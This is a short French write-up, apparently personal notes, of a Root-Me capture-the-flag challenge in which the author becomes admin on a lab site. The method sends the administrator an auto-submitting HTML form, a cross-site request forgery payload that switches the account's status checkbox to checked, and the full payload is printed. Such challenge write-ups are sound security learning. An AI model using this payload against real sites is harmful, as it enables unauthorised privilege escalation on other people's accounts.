---
categorie: web-client
tags:
  - rootme
  - "#informatique/cyber"
lien:
---
# But

Il faut passer admin sur un site

# Fourni

un site avec un login et un register, on fait un compte et ensuite on voit qu'on est pas admin

on voit qu'on ne peux pas valider son propre compte et qu'il faut un admin le fasse

# Méthode de résolution


sur la partie contact, on peut envoyer un mail a l'admin, en envoyant un formulaire en html qui est notre page validé, avec un script qui exécute le formulaire, on penssera à changer la partie checkbox, `disabled` -> `checked`, `action=profile"` -> `http://challenge01.root-me.org/web-client/ch22/index.php?action=profile


```
<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile"
<div class="form-group">
<label>Username:</label>
<input type="text" name="username" value="t">
</div>
<br>		
<div class="form-group">
<label>Status:</label>
<input type="checkbox" name="status" checked >
</div>
<br>	
<button type="submit">Submit</button>
<script>+document.forms[0].submit();</script>
```

on l'envoit, et on récupère le flag sur la page private : 

![[Pasted image 20250312104556.png]]

